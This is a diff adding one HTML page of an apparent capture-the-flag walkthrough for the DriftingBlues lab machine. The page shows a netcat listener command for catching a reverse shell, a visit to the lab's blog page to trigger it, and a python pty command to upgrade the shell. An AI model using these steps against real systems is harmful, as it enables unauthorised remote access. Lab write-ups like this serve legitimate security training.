@@ -1,0 +1,9 @@
+<!doctype html><html>
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>4.1 Access to reverse shell</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+  <script></script>
+</head>
+<body><div class="page"><h1 class="title">4.1 Access to reverse shell</h1><br/><br />1. On you Kali Machine run the following code.<br /><br />    <div class="codebox"><div class="codebox"><span style="color:#6a5acd;font-weight:400">$nc</span>&nbsp;-lvp&nbsp;1234&nbsp;</div></div><br /><br />2. Visit the <a href="http://driftingblues.box/blog">http://driftingblues.box/blog</a> page.<br /><br />3. On your “Reverse shell” you'll get a shell.<br />   <br />	<span style="color:#ffa500;">Output:</span><br />    <img src="images/796-1.png" alt="images/796-1.png" /><br /><br />4. Get a better shell. Run on your “Reverse shell” the following command.<br />    <div class="codebox"><div class="codebox">python3&nbsp;-c&nbsp;<span style="color:#ff00ff;font-weight:400">'import&nbsp;pty;pty.spawn("/bin/bash")'</span></div></div><br /><br />	<span style="color:#ffa500;">Output:</span><br />    <img src="images/796-2.png" alt="images/796-2.png" /><p align="center"><img src="images/home.png" height="22" width="22">  <a href="index.html">Index</a></p></div></body></html>
